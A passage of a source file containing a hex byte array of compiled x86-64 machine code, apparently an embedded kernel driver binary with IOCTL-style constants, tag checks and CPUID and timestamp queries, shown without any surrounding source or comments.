    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x48, 0x63, 0xDA,
    0x48, 0x8B, 0xE9, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x6D, 0x01,
    0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC5, 0x48,
    0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x4F, 0x01, 0x00, 0x00,
    0x81, 0x7D, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0x42, 0x01, 0x00, 0x00, 0x49, 0x8D, 0x80,
    0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x46, 0x01, 0x00, 0x00,
    0x49, 0x8B, 0xC0, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85,
    0x32, 0x01, 0x00, 0x00, 0x8D, 0x43, 0xFF, 0x3D, 0xFF, 0x7F, 0x00, 0x00, 0x0F, 0x87, 0x0D, 0x01,
    0x00, 0x00, 0x48, 0x89, 0x74, 0x24, 0x70, 0x48, 0x89, 0x7C, 0x24, 0x78, 0x4C, 0x89, 0xB4, 0x24,
    0x80, 0x00, 0x00, 0x00, 0x41, 0xBE, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0xD3, 0x48, 0x8D, 0x4C, 0x24,
    0x30, 0x4D, 0x8B, 0xC6, 0x48, 0xC1, 0xE2, 0x0C, 0x8B, 0xF3, 0xE8, 0x11, 0x36, 0x00, 0x00, 0x85,
    0xC0, 0x8B, 0xF8, 0x0F, 0x88, 0xD2, 0x00, 0x00, 0x00, 0xE8, 0x12, 0x1C, 0x00, 0x00, 0x48, 0x8B,
    0x54, 0x24, 0x30, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9,
    0x49, 0x83, 0xC8, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0x07, 0x00, 0x00, 0x00, 0xE8, 0xEF, 0x39, 0x00,
    0x00, 0x85, 0xC0, 0x8B, 0xF8, 0x0F, 0x88, 0x94, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30,
    0x48, 0x8B, 0xD5, 0xC7, 0x44, 0x24, 0x40, 0x05, 0x00, 0x00, 0x00, 0xE8, 0x70, 0xE5, 0xFF, 0xFF,
    0x85, 0xC0, 0x8B, 0xF8, 0x75, 0x6D, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0xE8, 0x90, 0x2E, 0x00, 0x00,
    0x4D, 0x85, 0xED, 0x49, 0x89, 0x04, 0x24, 0x74, 0x34, 0x85, 0xDB, 0x74, 0x30, 0x49, 0x8D, 0x7C,
    0xDD, 0x00, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x83, 0xEE, 0x01, 0x48, 0x83, 0xEF, 0x08, 0x48, 0x8B, 0xD6,
    0xE8, 0x2B, 0x2F, 0x00, 0x00, 0x41, 0x03, 0xDE, 0x48, 0x89, 0x07, 0x75, 0xE3, 0x33, 0xC0, 0x48,
    0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x4C, 0x8B, 0xB4, 0x24, 0x80, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x9C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5D, 0x41,
    0x5C, 0x5D, 0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x33, 0xD2, 0xE8, 0x71, 0x2F, 0x00, 0x00, 0x48,
    0x8B, 0x4C, 0x24, 0x30, 0x33, 0xD2, 0xE8, 0x65, 0x2F, 0x00, 0x00, 0x8B, 0xC7, 0xEB, 0xC0, 0xB8,
    0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50,
    0x41, 0x5D, 0x41, 0x5C, 0x5D, 0xC3, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5D, 0x41, 0x5C, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x2E, 0x49,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC0, 0x49,
    0x3B, 0xC0, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x14, 0x81, 0x79, 0x08, 0x64, 0x72, 0x69, 0x62,
    0x75, 0x0B, 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0xE9, 0xC3, 0xE5, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF,
    0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0x48, 0x8B, 0x49, 0x20, 0x49, 0x8B, 0xF0, 0x48, 0x8B,
    0xEA, 0xE8, 0x5A, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0x5F, 0x48, 0x48, 0x85, 0xDB, 0x74, 0x31, 0x90,
    0x48, 0x8D, 0x43, 0x3C, 0x4C, 0x8D, 0x46, 0x1C, 0x4C, 0x2B, 0xC0, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x0F, 0xB6, 0x10, 0x42, 0x0F, 0xB6, 0x0C, 0x00, 0x2B, 0xD1, 0x75, 0x08, 0x48, 0x83, 0xC0, 0x01,
    0x85, 0xC9, 0x75, 0xEC, 0x85, 0xD2, 0x74, 0x2C, 0x48, 0x8B, 0x1B, 0x48, 0x85, 0xDB, 0x75, 0xD0,
    0x8B, 0x4E, 0x18, 0x83, 0xC1, 0x7F, 0xE8, 0xA5, 0x3A, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B,
    0xD8, 0x75, 0x78, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0x34, 0x2B, 0x00, 0x00, 0x8D, 0x43, 0xF8, 0xE9,
    0x09, 0x01, 0x00, 0x00, 0x83, 0x43, 0x38, 0x01, 0x48, 0x8B, 0x43, 0x08, 0x48, 0x89, 0x46, 0x18,
    0x81, 0x7B, 0x34, 0x14, 0x82, 0x22, 0x00, 0x0F, 0x94, 0xC0, 0x88, 0x46, 0x20, 0x48, 0x8B, 0x45,
    0x10, 0x48, 0x85, 0xC0, 0x74, 0x0E, 0x48, 0x39, 0x58, 0x08, 0x74, 0x36, 0x48, 0x8B, 0x00, 0x48,
    0x85, 0xC0, 0x75, 0xF2, 0xB9, 0x18, 0x00, 0x00, 0x00, 0xE8, 0xD2, 0x39, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x0F, 0x84, 0xBB, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x10, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89,
    0x58, 0x08, 0x48, 0x8B, 0x4D, 0x10, 0x48, 0x89, 0x08, 0x48, 0x89, 0x45, 0x10, 0xE9, 0xA0, 0x00,
    0x00, 0x00, 0x83, 0x40, 0x10, 0x01, 0xE9, 0x97, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x7F, 0x48,
    0x8D, 0x4E, 0x1C, 0x48, 0x8D, 0x53, 0x3C, 0x48, 0x83, 0xE0, 0xE0, 0x48, 0x89, 0x43, 0x08, 0x8B,
    0x46, 0x18, 0xC7, 0x43, 0x34, 0x14, 0x82, 0x22, 0x00, 0x89, 0x43, 0x20, 0x33, 0xC0, 0x48, 0x2B,
    0xD1, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0x43, 0x18, 0xC7, 0x43, 0x38, 0x01, 0x00, 0x00, 0x00,
    0x0F, 0xB6, 0x01, 0x48, 0x83, 0xC1, 0x01, 0x84, 0xC0, 0x88, 0x44, 0x0A, 0xFF, 0x75, 0xF1, 0x48,
    0x8B, 0x47, 0x48, 0x48, 0x89, 0x03, 0x48, 0x89, 0x5F, 0x48, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x85,
    0xC0, 0x74, 0x0E, 0x48, 0x39, 0x58, 0x08, 0x74, 0x59, 0x48, 0x8B, 0x00, 0x48, 0x85, 0xC0, 0x75,
    0xF2, 0xB9, 0x18, 0x00, 0x00, 0x00, 0xE8, 0x35, 0x39, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x16,
    0xC7, 0x40, 0x10, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x08, 0x48, 0x8B, 0x4D, 0x10, 0x48,
    0x89, 0x08, 0x48, 0x89, 0x45, 0x10, 0x48, 0x8B, 0x43, 0x08, 0xC6, 0x46, 0x20, 0x01, 0x48, 0x89,
    0x46, 0x18, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0x25, 0x2A, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x5C,
    0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20,
    0x5F, 0xC3, 0x83, 0x40, 0x10, 0x01, 0xEB, 0xCE, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
    0x8B, 0xF9, 0x48, 0x8B, 0x49, 0x20, 0x49, 0x8B, 0xF0, 0x48, 0x8B, 0xDA, 0xE8, 0xAF, 0x29, 0x00,
    0x00, 0x4C, 0x8B, 0x5B, 0x10, 0x4D, 0x85, 0xDB, 0x74, 0x1C, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x49, 0x8B, 0x53, 0x08, 0x48, 0x8B, 0x46, 0x48, 0x48, 0x39, 0x42, 0x08, 0x74, 0x26, 0x4D, 0x8B,
    0x1B, 0x4D, 0x85, 0xDB, 0x75, 0xEA, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0xB1, 0x29, 0x00, 0x00, 0xB8,
    0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83,
    0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8B, 0x5A, 0x20, 0x44, 0x8B, 0x46, 0x64, 0x48, 0x89, 0x6C, 0x24,
    0x30, 0x45, 0x3B, 0xD8, 0x48, 0x8B, 0xEA, 0x74, 0x23, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0x7E, 0x29,
    0x00, 0x00, 0xB8, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x6C, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24,
    0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x81, 0x7A, 0x34, 0x14,
    0x82, 0x22, 0x00, 0x74, 0x10, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0x52, 0x29, 0x00, 0x00, 0xB8, 0xF7,
    0xFF, 0xFF, 0xFF, 0xEB, 0xD2, 0x8B, 0x4E, 0x50, 0x85, 0xC9, 0x74, 0x43, 0x83, 0xF9, 0x01, 0x75,
    0x62, 0x48, 0x83, 0x7E, 0x28, 0x00, 0x74, 0x5B, 0x48, 0x8B, 0x56, 0x30, 0x48, 0x85, 0xD2, 0x74,
    0x52, 0x48, 0x8B, 0x4E, 0x38, 0x48, 0x85, 0xC9, 0x74, 0x49, 0x48, 0x8B, 0x46, 0x40, 0x48, 0x85,
    0xC0, 0x74, 0x40, 0x4C, 0x8B, 0x4D, 0x08, 0x49, 0x2B, 0xD1, 0x49, 0x3B, 0xD0, 0x73, 0x34, 0x49,
    0x2B, 0xC9, 0x49, 0x3B, 0xC8, 0x73, 0x2C, 0x49, 0x2B, 0xC1, 0x49, 0x3B, 0xC0, 0x73, 0x24, 0x48,
    0x8B, 0x4E, 0x18, 0x48, 0x85, 0xC9, 0x74, 0x09, 0x48, 0x2B, 0x4D, 0x08, 0x49, 0x3B, 0xC8, 0x73,
    0x12, 0x48, 0x8B, 0x4E, 0x20, 0x48, 0x85, 0xC9, 0x74, 0x1C, 0x48, 0x2B, 0x4D, 0x08, 0x49, 0x3B,
    0xC8, 0x72, 0x13, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0xD4, 0x28, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF,
    0xFF, 0xE9, 0x51, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x4D, 0x08, 0x48, 0x8D, 0x56, 0x68, 0x4D, 0x8B,
    0xC3, 0xE8, 0x7A, 0x14, 0x00, 0x00, 0xC7, 0x45, 0x34, 0x18, 0x82, 0x22, 0x00, 0x48, 0x8B, 0x46,
    0x18, 0x48, 0x89, 0x45, 0x10, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x89, 0x45, 0x18, 0x8B, 0x46, 0x54,
    0x89, 0x45, 0x24, 0x8B, 0x46, 0x58, 0x89, 0x45, 0x28, 0x8B, 0x46, 0x5C, 0x89, 0x45, 0x2C, 0x8B,
    0x46, 0x60, 0x89, 0x45, 0x30, 0x83, 0x7E, 0x50, 0x01, 0x74, 0x06, 0x33, 0xF6, 0x8B, 0xDE, 0xEB,
    0x53, 0x48, 0x8B, 0x47, 0x28, 0x4C, 0x8B, 0x46, 0x40, 0x48, 0x8B, 0x56, 0x38, 0x48, 0x8B, 0x4E,
    0x30, 0x4C, 0x8B, 0x4E, 0x28, 0x33, 0xF6, 0x48, 0x85, 0xC0, 0x8B, 0xDE, 0x75, 0x12, 0x4C, 0x89,
    0x4F, 0x28, 0x48, 0x89, 0x4F, 0x30, 0x48, 0x89, 0x57, 0x38, 0x4C, 0x89, 0x47, 0x40, 0xEB, 0x20,
    0x48, 0x8B, 0x47, 0x28, 0x49, 0x3B, 0xC1, 0x75, 0x12, 0x48, 0x39, 0x4F, 0x30, 0x75, 0x0C, 0x48,
    0x39, 0x57, 0x38, 0x75, 0x06, 0x4C, 0x39, 0x47, 0x40, 0x74, 0x05, 0xBB, 0xFE, 0xFF, 0xFF, 0xFF,
    0x85, 0xDB, 0x78, 0x2B, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x85, 0xC0, 0x74, 0x22, 0xFF, 0xD0, 0x85,
    0xC0, 0x8B, 0xD8, 0x74, 0x25, 0x48, 0x8B, 0x4F, 0x28, 0x48, 0x3B, 0x4D, 0x08, 0x75, 0x10, 0x48,
    0x89, 0x77, 0x28, 0x48, 0x89, 0x77, 0x30, 0x48, 0x89, 0x77, 0x38, 0x48, 0x89, 0x77, 0x40, 0x85,
    0xDB, 0x74, 0x07, 0xC7, 0x45, 0x34, 0x14, 0x82, 0x22, 0x00, 0x48, 0x8B, 0x4F, 0x20, 0xE8, 0xED,
    0x27, 0x00, 0x00, 0x8B, 0xC3, 0xE9, 0x6D, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x6C, 0x24, 0x18, 0x56, 0x57, 0x41, 0x55, 0x48, 0x83,
    0xEC, 0x30, 0x48, 0x8B, 0xF1, 0x48, 0x8B, 0x49, 0x20, 0x49, 0x8B, 0xF8, 0x4C, 0x8B, 0xEA, 0xE8,
    0x8C, 0x27, 0x00, 0x00, 0x49, 0x8B, 0x5D, 0x10, 0x33, 0xED, 0x48, 0x85, 0xDB, 0x74, 0x1A, 0x90,
    0x48, 0x8B, 0x4B, 0x08, 0x48, 0x8B, 0x47, 0x18, 0x48, 0x39, 0x41, 0x08, 0x74, 0x2C, 0x48, 0x8B,
    0xEB, 0x48, 0x8B, 0x1B, 0x48, 0x85, 0xDB, 0x75, 0xE7, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0x8E, 0x27,
    0x00, 0x00, 0xB8, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0x48, 0x8B, 0x6C, 0x24,
    0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5F, 0x5E, 0xC3, 0x8B, 0x41, 0x38, 0x4C, 0x89, 0x64,
    0x24, 0x50, 0x45, 0x33, 0xE4, 0x83, 0xF8, 0x01, 0x48, 0x8B, 0xF9, 0x76, 0x15, 0x8B, 0x43, 0x10,
    0x83, 0xF8, 0x01, 0x76, 0x0D, 0x83, 0x41, 0x38, 0xFF, 0x83, 0x43, 0x10, 0xFF, 0xE9, 0xDB, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x44,
    0x88, 0x64, 0x24, 0x28, 0xE8, 0xD7, 0x1F, 0x00, 0x00, 0x44, 0x8B, 0x5F, 0x38, 0x41, 0x83, 0xFB,
    0x01, 0x77, 0x30, 0x48, 0x8B, 0x56, 0x08, 0x48, 0x85, 0xD2, 0x74, 0x58, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4A, 0x10, 0x8B, 0x47, 0x20, 0x48, 0x2B, 0x4F, 0x08, 0x48, 0x3B, 0xC8, 0x72, 0x0B,
    0x48, 0x8B, 0x52, 0x08, 0x48, 0x85, 0xD2, 0x75, 0xE7, 0xEB, 0x39, 0x41, 0xBC, 0x8E, 0xFF, 0xFF,
    0xFF, 0xEB, 0x31, 0x49, 0x8B, 0x55, 0x20, 0x48, 0x85, 0xD2, 0x74, 0x28, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x42, 0x08, 0x48, 0x8B, 0x48, 0x10, 0x8B, 0x47, 0x20, 0x48, 0x2B, 0x4F, 0x08, 0x48,
    0x3B, 0xC8, 0x72, 0x0A, 0x48, 0x8B, 0x12, 0x48, 0x85, 0xD2, 0x75, 0xE4, 0xEB, 0x06, 0x41, 0xBC,
    0x8E, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x7F, 0x1F, 0x00,
    0x00, 0x45, 0x85, 0xE4, 0x75, 0x47, 0x48, 0x85, 0xED, 0x74, 0x09, 0x48, 0x8B, 0x03, 0x48, 0x89,
    0x45, 0x00, 0xEB, 0x07, 0x48, 0x8B, 0x03, 0x49, 0x89, 0x45, 0x10, 0x48, 0xC7, 0x43, 0x08, 0x00,
    0x00, 0x00, 0x00, 0x48, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0xCE, 0x35,
    0x00, 0x00, 0x44, 0x8B, 0x5F, 0x38, 0x41, 0x83, 0xFB, 0x01, 0x77, 0x0D, 0x48, 0x8B, 0xD7, 0x48,
    0x8B, 0xCE, 0xE8, 0x19, 0xE4, 0xFF, 0xFF, 0xEB, 0x04, 0x83, 0x47, 0x38, 0xFF, 0x48, 0x8B, 0x4E,
    0x20, 0xE8, 0x6A, 0x26, 0x00, 0x00, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x33, 0xC0, 0xE9, 0xD5, 0xFE,
    0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48,
    0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x8B, 0xF2, 0x4D, 0x8B, 0xE0,
    0x48, 0x8B, 0xF9, 0x33, 0xD2, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0x49, 0x8B,
    0xE9, 0xE8, 0xDA, 0x10, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xC7, 0x06, 0x06, 0x01, 0x59, 0x19, 0xC7,
    0x46, 0x04, 0x00, 0x00, 0x02, 0x00, 0xE8, 0x95, 0xC7, 0xFF, 0xFF, 0x83, 0xF8, 0x01, 0x0F, 0x86,
    0x89, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0xB4, 0xC7, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0x07,
    0xB8, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x7B, 0x33, 0xC0, 0x0F, 0xA2, 0x83, 0xF8, 0x01, 0x89, 0x44,
    0x24, 0x20, 0x89, 0x5C, 0x24, 0x24, 0x89, 0x4C, 0x24, 0x28, 0x89, 0x54, 0x24, 0x2C, 0x72, 0x5D,
    0x81, 0xFB, 0x41, 0x75, 0x74, 0x68, 0x75, 0x55, 0x81, 0xF9, 0x63, 0x41, 0x4D, 0x44, 0x75, 0x4D,
    0x81, 0xFA, 0x65, 0x6E, 0x74, 0x69, 0x75, 0x45, 0xB8, 0x00, 0x00, 0x00, 0x80, 0x0F, 0xA2, 0x3D,
    0x07, 0x00, 0x00, 0x80, 0x89, 0x44, 0x24, 0x30, 0x89, 0x5C, 0x24, 0x34, 0x89, 0x4C, 0x24, 0x38,
    0x89, 0x54, 0x24, 0x3C, 0x72, 0x27, 0xB8, 0x07, 0x00, 0x00, 0x80, 0x0F, 0xA2, 0x0F, 0xBA, 0xE2,
    0x08, 0x89, 0x44, 0x24, 0x40, 0x89, 0x5C, 0x24, 0x44, 0x89, 0x4C, 0x24, 0x48, 0x89, 0x54, 0x24,
    0x4C, 0x72, 0x0A, 0xF6, 0xC2, 0x3E, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x75, 0x05, 0xB8, 0x01, 0x00,
    0x00, 0x00, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x89, 0x46, 0x08, 0x33, 0xD2, 0x89, 0x4E,
    0x10, 0xB8, 0x00, 0xCA, 0x9A, 0x3B, 0xBB, 0x20, 0x00, 0x00, 0x00, 0xF7, 0xF1, 0x48, 0x8D, 0x8E,
    0x08, 0x01, 0x00, 0x00, 0x49, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x89, 0x46,
    0x14, 0x48, 0x89, 0x6E, 0x18, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0xC7, 0x41, 0xF8, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x29, 0x0F, 0x31, 0x48, 0xC1, 0xE2, 0x20,
    0x48, 0x83, 0xC1, 0x60, 0x48, 0x0B, 0xC2, 0x48, 0x83, 0xEB, 0x01, 0x48, 0x89, 0x41, 0xA8, 0x4C,
    0x89, 0x41, 0xB0, 0xC7, 0x41, 0x9C, 0x00, 0x00, 0x00, 0x20, 0xC7, 0x41, 0xC0, 0x00, 0x00, 0x00,
    0x20, 0xC7, 0x41, 0xC4, 0x00, 0x00, 0x00, 0x20, 0xC7, 0x41, 0xC8, 0x00, 0x00, 0x00, 0x20, 0xC7,
    0x41, 0xCC, 0x00, 0x00, 0x00, 0x20, 0xC7, 0x41, 0xD0, 0x00, 0x00, 0x00, 0x20, 0xC7, 0x41, 0xD4,
    0x00, 0x00, 0x00, 0x20, 0xC7, 0x41, 0xD8, 0x00, 0x00, 0x00, 0x20, 0xC7, 0x41, 0xDC, 0x00, 0x00,
    0x00, 0x20, 0x75, 0x9C, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x89, 0x77, 0x58, 0x48, 0x8B, 0x74,
    0x24, 0x70, 0x4C, 0x89, 0x67, 0x60, 0x89, 0x5F, 0x68, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x8B,
    0x7C, 0x24, 0x78, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xDA, 0xE8, 0xF2, 0xEA, 0xFF, 0xFF, 0x48, 0x8B,
    0x4B, 0x28, 0xE8, 0x89, 0x1C, 0x00, 0x00, 0x45, 0x33, 0xDB, 0x48, 0x8B, 0xCB, 0x4C, 0x89, 0x5B,
    0x28, 0x4C, 0x89, 0x1B, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xE9, 0xB2, 0x33, 0x00, 0x00, 0xCC, 0xCC,
    0x40, 0x53, 0x55, 0x41, 0x55, 0x48, 0x83, 0xEC, 0x30, 0x49, 0x8B, 0xE8, 0x45, 0x8B, 0x41, 0x10,
    0x49, 0x8B, 0xD9, 0x41, 0x8B, 0xC0, 0x4C, 0x8B, 0xEA, 0x4C, 0x8B, 0xD1, 0x25, 0xFF, 0x00, 0x00,
    0xFF, 0x3D, 0x42, 0x00, 0x00, 0x42, 0x0F, 0x85, 0x76, 0x0D, 0x00, 0x00, 0x41, 0x8B, 0x51, 0x08,
    0x83, 0xFA, 0x18, 0x0F, 0x82, 0x69, 0x0D, 0x00, 0x00, 0x45, 0x8B, 0x49, 0x0C, 0x41, 0x83, 0xF9,
    0x18, 0x0F, 0x82, 0x5B, 0x0D, 0x00, 0x00, 0x48, 0x81, 0xF9, 0x04, 0x82, 0x22, 0x00, 0x75, 0x25,
    0x8B, 0x03, 0x3D, 0x74, 0x6F, 0x72, 0x69, 0x74, 0x34, 0x48, 0x8D, 0x0D, 0x88, 0x5B, 0x00, 0x00,
    0x8B, 0xD0, 0xE8, 0x11, 0x0E, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x8B, 0x0B, 0x41, 0x3B, 0x4D, 0x18, 0x0F, 0x85, 0x01, 0x0D, 0x00,
    0x00, 0x8B, 0x45, 0x08, 0x39, 0x43, 0x04, 0x0F, 0x85, 0xF5, 0x0C, 0x00, 0x00, 0x49, 0x8D, 0x82,
    0xFC, 0x7D, 0xDD, 0xFF, 0x48, 0x89, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xF8, 0x50, 0x0F, 0x87, 0xCE,
    0x0C, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC6, 0xBD, 0xFF, 0xFF, 0x41, 0x0F, 0xB6, 0x84, 0x00, 0xB0,
    0x4F, 0x00, 0x00, 0x41, 0x8B, 0x8C, 0x80, 0x58, 0x4F, 0x00, 0x00, 0x49, 0x03, 0xC8, 0xFF, 0xE1,
    0x83, 0xFA, 0x30, 0x0F, 0x85, 0xF1, 0x00, 0x00, 0x00, 0x41, 0x83, 0xF9, 0x38, 0x0F, 0x85, 0xE7,
    0x00, 0x00, 0x00, 0x44, 0x8D, 0x42, 0xE0, 0x48, 0x8D, 0x4B, 0x18, 0x48, 0x8D, 0x15, 0xF6, 0x5A,
    0x00, 0x00, 0xE8, 0x83, 0x12, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x27, 0x48, 0x8D, 0x53, 0x18, 0x48,
    0x8D, 0x0D, 0xBA, 0x5A, 0x00, 0x00, 0xE8, 0x7D, 0x0D, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0xC7, 0x43, 0x14, 0xFD, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0x44, 0x8B, 0x43, 0x2C, 0x41, 0x81, 0xF8, 0x02, 0x00, 0x07, 0x00, 0x77, 0x4A, 0x41,
    0x8B, 0xC0, 0x25, 0x00, 0x00, 0xFF, 0xFF, 0x3D, 0x00, 0x00, 0x07, 0x00, 0x75, 0x3B, 0x41, 0x8B,
    0x45, 0x18, 0x33, 0xFF, 0x89, 0x43, 0x18, 0x8B, 0x45, 0x08, 0x89, 0x7B, 0x14, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0x89, 0x43, 0x1C, 0xC7, 0x43, 0x20, 0x02, 0x00, 0x07, 0x00, 0x33, 0xC0, 0xC7, 0x43,
    0x24, 0x02, 0x00, 0x07, 0x00, 0x48, 0x89, 0x6B, 0x30, 0xC7, 0x43, 0x28, 0x53, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x8B, 0x53, 0x28, 0x48, 0x8D, 0x0D, 0xED,
